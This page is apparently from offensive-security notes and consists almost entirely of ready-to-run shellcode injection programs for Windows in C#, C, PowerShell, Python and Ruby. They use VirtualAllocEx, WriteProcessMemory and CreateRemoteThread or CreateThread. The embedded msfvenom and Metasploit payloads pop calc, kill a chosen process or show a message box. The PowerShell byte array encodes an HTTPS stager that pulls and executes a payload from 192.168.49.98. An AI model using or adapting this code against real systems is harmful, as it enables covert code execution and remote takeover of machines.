# CreateThread Shellcode Injection

{% tabs %}
{% tab title="C\#" %}
{% code title="Shellcode-Process-Injector.cs" %}
```csharp
// This code was originally published on codingvision. 
// http://www.codingvision.net/miscellaneous/c-inject-a-dll-into-a-process-w-createremotethread
//
// Minor tweaks and commenting by @pwndizzle
//
// To run:
// 1. Download or compile a target dll (see calc reference in readme) and place in c:\
// 2. Compile code - C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe process-dll-injection.cs
// 3. Start notepad
// 4. Execute process-dll-injection.exe to see calc pop


using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;


public class ProcessInject
{
    [DllImport("kernel32.dll")]
    public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);

    [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
    public static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
    static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress,uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);

    [DllImport("kernel32.dll")]
    static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int dwSize, ref int lpNumberOfBytesRead);

    [DllImport("kernel32.dll")]
    static extern IntPtr CreateRemoteThread(IntPtr hProcess,
        IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    // privileges
    const int PROCESS_CREATE_THREAD = 0x0002;
    const int PROCESS_QUERY_INFORMATION = 0x0400;
    const int PROCESS_VM_OPERATION = 0x0008;
    const int PROCESS_VM_WRITE = 0x0020;
    const int PROCESS_VM_READ = 0x0010;

    // used for memory allocation
    const uint MEM_COMMIT = 0x00001000;
    const uint MEM_RESERVE = 0x00002000;
    const uint PAGE_READWRITE = 4;

    public static int Main()
    {

        // Get process id
        Console.WriteLine("Get process by name...");
    Process targetProcess = Process.GetProcessesByName("notepad")[0];
    Console.WriteLine("Found procId: " + targetProcess.Id);

        // Get handle of the process - with required privileges
    Console.WriteLine("Getting handle to process...");
        IntPtr procHandle = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, false, targetProcess.Id);
        Console.WriteLine("Got procHandle: " + procHandle);

        // Get address of LoadLibraryA and store in a pointer
    Console.WriteLine("Getting loadlibrary pointer...");
        IntPtr loadLibraryAddr = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
    Console.WriteLine("Loadlibrary pointer: " + loadLibraryAddr);

        // Path to dll that will be injected
        string dllName = "C:\\calc-x64.dll";

        // Allocate memory for dll path and store pointer
    Console.WriteLine("Allocating memory...");
        IntPtr allocMemAddress = VirtualAllocEx(procHandle, IntPtr.Zero, (uint)((dllName.Length + 1) * Marshal.SizeOf(typeof(char))), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    Console.WriteLine("allocMemAddress: " + allocMemAddress);

        // Write path of dll to memory
    Console.WriteLine("Writing content to memory...");
        UIntPtr bytesWritten;
        bool resp1 = WriteProcessMemory(procHandle, allocMemAddress, Encoding.Default.GetBytes(dllName), (uint)((dllName.Length + 1) * Marshal.SizeOf(typeof(char))), out bytesWritten);

    // Read contents of memory
    int bytesRead = 0;
        byte[] buffer = new byte[24];
    Console.WriteLine("Reading content from memory...");
    ReadProcessMemory(procHandle, allocMemAddress, buffer, buffer.Length, ref bytesRead);
        Console.WriteLine("Data in memory: " + System.Text.Encoding.UTF8.GetString(buffer));

        // Create a thread that will call LoadLibraryA with allocMemAddress as argument
    Console.WriteLine("CreateRemoteThread");
        CreateRemoteThread(procHandle, IntPtr.Zero, 0, loadLibraryAddr, allocMemAddress, 0, IntPtr.Zero);

        return 0;
    }
}
```
{% endcode %}
{% endtab %}

{% tab title="C/C++" %}
{% code title="Shellcode-Process-Injector.c" %}
```c
#include <windows.h>
#include <sys/types.h>
#include <unistd.h>


int main(int argc, char **argv){
  // make sure that you will inject a process working under the same architecture
  // if you want to run the executable under x64 make sure to compile it with 64bit compiler


  // the process id you want to inject the shellcode into
    int process_id = atoi(argv[1]);

    // msfvenom -p windows/x64/exec cmd=calc.exe EXITFUNC=thread -f c -v shellcode
    char shellcode[] = \
  "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"
  "\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"
  "\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"
  "\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
  "\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"
  "\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01"
  "\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48"
  "\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"
  "\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c"
  "\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0"
  "\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04"
  "\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"
  "\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"
  "\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
  "\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f"
  "\x87\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd\x9d\xff"
  "\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"
  "\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c"
  "\x63\x2e\x65\x78\x65\x00";


    HANDLE process_handle;
    DWORD pointer_after_allocated;

  // open the process and save the handle
    process_handle =  OpenProcess(PROCESS_ALL_ACCESS, FALSE, process_id);
    if (process_handle==NULL)
{
      puts("[-]Error while open the process\n");

}else{
    puts("[+] Process Opened sucessfully\n");
}
  // Allocate the required memory
    pointer_after_allocated = VirtualAllocEx(process_handle, NULL , sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if(pointer_after_allocated==NULL){
        puts("[-]Error while get the base address to write\n");
    }else{
        printf("[+]Got the address to write 0x%x\n", pointer_after_allocated);
    }
  // check if the shellcode has been written
    if(WriteProcessMemory(process_handle, (LPVOID)pointer_after_allocated, (LPCVOID)shellcode, sizeof(shellcode), 0)){
        puts("[+]Injected\n");
        puts("[+]Running the shellcode as new thread !\n");

    // create thread and execute the shellcode
        CreateRemoteThread(process_handle, NULL, 100,(LPTHREAD_START_ROUTINE)pointer_after_allocated, NULL, NULL, 0x50002);

    }else{
    puts("Not Injected\n");
    }



}
```
{% endcode %}
{% endtab %}

{% tab title="Powershell" %}
{% code title="Shellcode-Process-Injector.ps1" %}
```powershell
$Kernel32 = @"
using System;
using System.Runtime.InteropServices;

public class Kernel32 {
  [DllImport("kernel32", SetLastError=true)]
  public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
  [DllImport("kernel32", CharSet=CharSet.Ansi, SetLastError=true)]
  public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
  [DllImport("kernel32", SetLastError=true)]
  public static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
}
"@

Add-Type $Kernel32

[Byte[]] $buf = 0xfc,0xe8,0x8f,0x0,0x0,0x0,0x60,0x31,0xd2,0x89,0xe5,0x64,0x8b,0x52,0x30,0x8b,0x52,0xc,0x8b,0x52,0x14,0x8b,0x72,0x28,0x31,0xff,0xf,0xb7,0x4a,0x26,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x2,0x2c,0x20,0xc1,0xcf,0xd,0x1,0xc7,0x49,0x75,0xef,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x1,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4c,0x1,0xd0,0x8b,0x58,0x20,0x1,0xd3,0x8b,0x48,0x18,0x50,0x85,0xc9,0x74,0x3c,0x31,0xff,0x49,0x8b,0x34,0x8b,0x1,0xd6,0x31,0xc0,0xac,0xc1,0xcf,0xd,0x1,0xc7,0x38,0xe0,0x75,0xf4,0x3,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe0,0x58,0x8b,0x58,0x24,0x1,0xd3,0x66,0x8b,0xc,0x4b,0x8b,0x58,0x1c,0x1,0xd3,0x8b,0x4,0x8b,0x1,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xe9,0x80,0xff,0xff,0xff,0x5d,0x68,0x6e,0x65,0x74,0x0,0x68,0x77,0x69,0x6e,0x69,0x54,0x68,0x4c,0x77,0x26,0x7,0xff,0xd5,0x31,0xdb,0x53,0x53,0x53,0x53,0x53,0xe8,0x3e,0x0,0x0,0x0,0x4d,0x6f,0x7a,0x69,0x6c,0x6c,0x61,0x2f,0x35,0x2e,0x30,0x20,0x28,0x57,0x69,0x6e,0x64,0x6f,0x77,0x73,0x20,0x4e,0x54,0x20,0x36,0x2e,0x31,0x3b,0x20,0x54,0x72,0x69,0x64,0x65,0x6e,0x74,0x2f,0x37,0x2e,0x30,0x3b,0x20,0x72,0x76,0x3a,0x31,0x31,0x2e,0x30,0x29,0x20,0x6c,0x69,0x6b,0x65,0x20,0x47,0x65,0x63,0x6b,0x6f,0x0,0x68,0x3a,0x56,0x79,0xa7,0xff,0xd5,0x53,0x53,0x6a,0x3,0x53,0x53,0x68,0xbb,0x1,0x0,0x0,0xe8,0x32,0x1,0x0,0x0,0x2f,0x41,0x7a,0x42,0x4d,0x68,0x76,0x67,0x65,0x6a,0x75,0x5a,0x38,0x7a,0x48,0x33,0x4e,0x49,0x78,0x6c,0x57,0x33,0x67,0x47,0x71,0x49,0x69,0x6f,0x33,0x32,0x52,0x63,0x4a,0x6b,0x45,0x67,0x6e,0x37,0x4e,0x50,0x32,0x78,0x66,0x58,0x79,0x78,0x50,0x55,0x68,0x38,0x6a,0x70,0x4d,0x6a,0x32,0x6f,0x48,0x54,0x75,0x39,0x57,0x5f,0x57,0x4f,0x68,0x4d,0x56,0x61,0x53,0x4b,0x72,0x5a,0x62,0x78,0x63,0x36,0x6c,0x6a,0x68,0x38,0x48,0x34,0x72,0x41,0x46,0x41,0x47,0x72,0x32,0x57,0x59,0x37,0x62,0x6e,0x5a,0x46,0x67,0x32,0x4b,0x72,0x45,0x47,0x69,0x56,0x32,0x76,0x41,0x69,0x50,0x65,0x30,0x34,0x50,0x68,0x73,0x44,0x6b,0x5f,0x77,0x65,0x66,0x69,0x36,0x61,0x48,0x75,0x6a,0x67,0x51,0x71,0x4c,0x61,0x59,0x55,0x76,0x74,0x37,0x71,0x61,0x54,0x52,0x6a,0x36,0x35,0x38,0x44,0x75,0x57,0x73,0x73,0x31,0x63,0x57,0x44,0x50,0x44,0x6a,0x6b,0x6d,0x50,0x6b,0x44,0x0,0x50,0x68,0x57,0x89,0x9f,0xc6,0xff,0xd5,0x89,0xc6,0x53,0x68,0x0,0x32,0xe8,0x84,0x53,0x53,0x53,0x57,0x53,0x56,0x68,0xeb,0x55,0x2e,0x3b,0xff,0xd5,0x96,0x6a,0xa,0x5f,0x68,0x80,0x33,0x0,0x0,0x89,0xe0,0x6a,0x4,0x50,0x6a,0x1f,0x56,0x68,0x75,0x46,0x9e,0x86,0xff,0xd5,0x53,0x53,0x53,0x53,0x56,0x68,0x2d,0x6,0x18,0x7b,0xff,0xd5,0x85,0xc0,0x75,0x14,0x68,0x88,0x13,0x0,0x0,0x68,0x44,0xf0,0x35,0xe0,0xff,0xd5,0x4f,0x75,0xcd,0xe8,0x4a,0x0,0x0,0x0,0x6a,0x40,0x68,0x0,0x10,0x0,0x0,0x68,0x0,0x0,0x40,0x0,0x53,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x53,0x89,0xe7,0x57,0x68,0x0,0x20,0x0,0x0,0x53,0x56,0x68,0x12,0x96,0x89,0xe2,0xff,0xd5,0x85,0xc0,0x74,0xcf,0x8b,0x7,0x1,0xc3,0x85,0xc0,0x75,0xe5,0x58,0xc3,0x5f,0xe8,0x6b,0xff,0xff,0xff,0x31,0x39,0x32,0x2e,0x31,0x36,0x38,0x2e,0x34,0x39,0x2e,0x39,0x38,0x0,0xbb,0xe0,0x1d,0x2a,0xa,0x68,0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x3c,0x6,0x7c,0xa,0x80,0xfb,0xe0,0x75,0x5,0xbb,0x47,0x13,0x72,0x6f,0x6a,0x0,0x53,0xff,0xd5

$size = $buf.Length

Write-Host "[+] VirtualAlloc()"
[IntPtr]$addr = [Kernel32]::VirtualAlloc(0,$size,0x3000,0x40);$LastError = [ComponentModel.Win32Exception][Runtime.InteropServices.Marshal]::GetLastWin32Error()
$LastError
$LastError | Out-File C:\Users\Offsec\Desktop\errors.txt -Append

Write-Host "[+] Copy"
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $addr, $size);$LastError = [ComponentModel.Win32Exception][Runtime.InteropServices.Marshal]::GetLastWin32Error()
$LastError
$LastError | Out-File C:\Users\Offsec\Desktop\errors.txt -Append

Write-Host "[+] CreateThread()"
$thandle=[Kernel32]::CreateThread(0,0,$addr,0,0,0);$LastError = [ComponentModel.Win32Exception][Runtime.InteropServices.Marshal]::GetLastWin32Error()
$LastError
$LastError | Out-File C:\Users\Offsec\Desktop\errors.txt -Append

Write-Host "[+] WaitForSingleObject()"
[Kernel32]::WaitForSingleObject($thandle, [uint32]"0xFFFFFFFF");$LastError = [ComponentModel.Win32Exception][Runtime.InteropServices.Marshal]::GetLastWin32Error()
$LastError
$LastError | Out-File C:\Users\Offsec\Desktop\errors.txt -Append

Write-Host "Done"
```
{% endcode %}
{% endtab %}

{% tab title="Python" %}
{% code title="shellcode-process-injection.py" %}
```python
'''
Example taken from Gray Hat Python
The script inject a shellcode which tasks is to kill the given process, so that the process will not be killed by our process directly.
'''

import sys
from ctypes import *

# We set the EXECUTE access mask so that our shellcode will execute in the memory block we have allocated
PAGE_EXECUTE_READWRITE = 0x00000040
PROCESS_ALL_ACCESS = ( 0x000F0000 | 0x00100000 | 0xFFF )
VIRTUAL_MEM  = ( 0x1000 | 0x2000 )

kernel32 = windll.kernel32
pid = int(sys.argv[1])
pid_to_kill = sys.argv[2]

if not sys.argv[1] or not sys.argv[2]:
    print "Code Ijnector: ./code_injector.py  "
    sys.exit(0)

#/* win32_exec -  EXITFUNC=thread CMD=cmd.exe /c taskkill /PID AAAA 
#Size=159 Encoder=None http://metasploit.com */
shellcode = \
"\xfc\xe8\x44\x00\x00\x00\x8b\x45\x3c\x8b\x7c\x05\x78\x01\xef\x8b" \
"\x4f\x18\x8b\x5f\x20\x01\xeb\x49\x8b\x34\x8b\x01\xee\x31\xc0\x99" \
"\xac\x84\xc0\x74\x07\xc1\xca\x0d\x01\xc2\xeb\xf4\x3b\x54\x24\x04" \
"\x75\xe5\x8b\x5f\x24\x01\xeb\x66\x8b\x0c\x4b\x8b\x5f\x1c\x01\xeb" \
"\x8b\x1c\x8b\x01\xeb\x89\x5c\x24\x04\xc3\x31\xc0\x64\x8b\x40\x30" \
"\x85\xc0\x78\x0c\x8b\x40\x0c\x8b\x70\x1c\xad\x8b\x68\x08\xeb\x09" \
"\x8b\x80\xb0\x00\x00\x00\x8b\x68\x3c\x5f\x31\xf6\x60\x56\x89\xf8" \
"\x83\xc0\x7b\x50\x68\xef\xce\xe0\x60\x68\x98\xfe\x8a\x0e\x57\xff" \
"\xe7\x63\x6d\x64\x2e\x65\x78\x65\x20\x2f\x63\x20\x74\x61\x73\x6b" \
"\x6b\x69\x6c\x6c\x20\x2f\x50\x49\x44\x20\x41\x41\x41\x41\x00"

padding = 4 - (len(pid_to_kill)) #Use to complete with \x00 if pid to kill &lt; 4 digits
replace_value = pid_to_kill + ("\x00" * padding) #Create the replacement PID string
replace_string = "\x41" * 4

shellcode = shellcode.replace(replace_string,replace_value) #Replace PID in the shellcode
code_size = len(shellcode)

#Get a handle to the process we are injecting into (like in dll_injector)
h_process = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, int(pid))

if not h_process:
    print "[*] Couldn't acquire a handle to PID: %s" % pid
    sys.exit(0)

#Allocate some space for the shellcode (in the program memory)
arg_address = kernel32.VirtualAllocEx(h_process, 0, code_size, VIRTUAL_MEM, PAGE_EXECUTE_READWRITE)

#Write out the shellcode
written = c_int(0)
kernel32.WriteProcessMemory(h_process, arg_address, shellcode, code_size, byref(written))

#Now we create the remote thread and point its entry routine to be head of our shellcode
thread_id = c_ulong(0)
if not kernel32.CreateRemoteThread(h_process, None, 0, arg_address, None, 0, byref(thread_id)):
    print "[*] Failed to inject process-killing shellcode. Exiting."
    sys.exit(0)

print "[*] Remote thread created with a thread ID of: 0x%08x" % thread_id.value
print "[*] Process %s should not be running anymore !" % pid_to_kill
```
{% endcode %}
{% endtab %}

{% tab title="Ruby" %}
{% code title="shellcode-process-injection.rb" %}
```ruby
require 'fiddle'
require 'fiddle/import'
require 'fiddle/types'

# msfvenom -a x86 --platform Windows -p windows/messagebox TEXT="@KINGSABRI" -f ruby --smallest
shellcode =
    "\xd9\xeb\x9b\xd9\x74\x24\xf4\x31\xd2\xb2\x77\x31\xc9\x64" +
    "\x8b\x71\x30\x8b\x76\x0c\x8b\x76\x1c\x8b\x46\x08\x8b\x7e" +
    "\x20\x8b\x36\x38\x4f\x18\x75\xf3\x59\x01\xd1\xff\xe1\x60" +
    "\x8b\x6c\x24\x24\x8b\x45\x3c\x8b\x54\x28\x78\x01\xea\x8b" +
    "\x4a\x18\x8b\x5a\x20\x01\xeb\xe3\x34\x49\x8b\x34\x8b\x01" +
    "\xee\x31\xff\x31\xc0\xfc\xac\x84\xc0\x74\x07\xc1\xcf\x0d" +
    "\x01\xc7\xeb\xf4\x3b\x7c\x24\x28\x75\xe1\x8b\x5a\x24\x01" +
    "\xeb\x66\x8b\x0c\x4b\x8b\x5a\x1c\x01\xeb\x8b\x04\x8b\x01" +
    "\xe8\x89\x44\x24\x1c\x61\xc3\xb2\x08\x29\xd4\x89\xe5\x89" +
    "\xc2\x68\x8e\x4e\x0e\xec\x52\xe8\x9f\xff\xff\xff\x89\x45" +
    "\x04\xbb\x7e\xd8\xe2\x73\x87\x1c\x24\x52\xe8\x8e\xff\xff" +
    "\xff\x89\x45\x08\x68\x6c\x6c\x20\x41\x68\x33\x32\x2e\x64" +
    "\x68\x75\x73\x65\x72\x30\xdb\x88\x5c\x24\x0a\x89\xe6\x56" +
    "\xff\x55\x04\x89\xc2\x50\xbb\xa8\xa2\x4d\xbc\x87\x1c\x24" +
    "\x52\xe8\x5f\xff\xff\xff\x68\x6f\x78\x58\x20\x68\x61\x67" +
    "\x65\x42\x68\x4d\x65\x73\x73\x31\xdb\x88\x5c\x24\x0a\x89" +
    "\xe3\x68\x52\x49\x58\x20\x68\x47\x53\x41\x42\x68\x40\x4b" +
    "\x49\x4e\x31\xc9\x88\x4c\x24\x0a\x89\xe1\x31\xd2\x52\x53" +
    "\x51\x52\xff\xd0\x31\xc0\x50\xff\x55\x08"

include Fiddle
# Load kernel32.dll class
puts "[-] Loading kernel32.dll"
kernel32 = Fiddle.dlopen('kernel32')

# allocate a virtual memeory for our shellcde
puts "[-] VirtualAlloc"
ptr = Function.new(kernel32['VirtualAlloc'], [4,4,4,4], 4).call(0, shellcode.size, 0x3000, 0x40)

# change the protection of the allocated memory (optional)
Function.new(kernel32['VirtualProtect'], [4,4,4,4], 4).call(ptr, shellcode.size, 0, 0)

# create a buffer that contains our shellcode
puts "[-] Create buffer"
buf = Fiddle::Pointer[shellcode]

# copy the buffer to the allocated our allocated memory
puts "[-] RtlMoveMemory"
Function.new(kernel32['RtlMoveMemory'], [4, 4, 4], 4).call(ptr, buf, shellcode.size)

# create a thread that executes the shellcode that allocated in the memory
puts "[-] CreateThread"
thread = Function.new(kernel32['CreateThread'], [4,4,4,4,4,4], 4).call(0, 0, ptr, 0, 0, 0)

# wait forever for the shellcode thread execution
puts "[-] WaitForSingleObject"
Function.new(kernel32['WaitForSingleObject'], [4,4], 4).call(thread, -1)
```
{% endcode %}
{% endtab %}
{% endtabs %}

